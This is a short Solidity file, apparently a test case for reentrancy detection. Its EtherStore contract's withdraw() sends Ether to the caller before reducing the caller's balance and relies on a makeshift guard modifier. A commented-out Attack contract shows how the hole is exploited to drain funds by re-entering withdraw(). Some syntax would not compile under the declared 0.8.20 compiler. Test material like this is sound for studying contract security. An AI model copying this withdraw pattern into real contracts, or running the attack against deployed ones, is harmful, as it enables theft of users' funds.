error ReentrancyError();
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
// import "./Dao.sol";
struct Hello{
    string test;
}
contract EtherStore  is ReentrancyGuard{

    Hello hello1;
    int [10] i ;
    int j;
    mapping(address => uint256) balances;
    
    modifier simpleReentrancy()
    {
        (int[10] storage k,uint m ,string storage str1 )= (i,2,hello1.test); 
        Hello storage hello = hello1;
        hello.test = "Hello";
        if(j == 2 )
        {
             revert ReentrancyError();
        }
        j = 1;
        _;
        j = 0;
        // j++;
    }
    function withdraw()  simpleReentrancy external{
        
        
        require(balances[msg.sender] > 0);
        
        // if(i <= 0){
        //     revert ReentrancyError();
        // } 
        //balances[msg.sender]--;
       


        payable (msg.sender).call.value(1)();
        balances[msg.sender]--;
        // else if(false)
        // {
            
        // }
        // else
        //     balances[msg.sender] = 1;

        
    }

    function getBalance()  public view returns (uint256) {
            

        return address(this).balance;
    }
}

// contract Attack {
//     EtherStore public etherStore;
//     uint256 public constant AMOUNT = 1 ether;

//     constructor(address _etherStoreAddress) {
//         etherStore = EtherStore(_etherStoreAddress);
//     }

//     // Fallback is called when EtherStore sends Ether to this contract.
//     fallback() external payable {
//         if (address(etherStore).balance >= AMOUNT) {
//             etherStore.withdraw();
            
//         }
//     }

//     function attack() external payable {
//         require(msg.value >= AMOUNT);
//         etherStore.deposit{value: AMOUNT}();
//         etherStore.withdraw();
//     }

//     // Helper function to check the balance of this contract
//     function getBalance() public view returns (uint256) {
//         return address(this).balance;
//     }
// }
// SPDX-License-Identifier: MIT

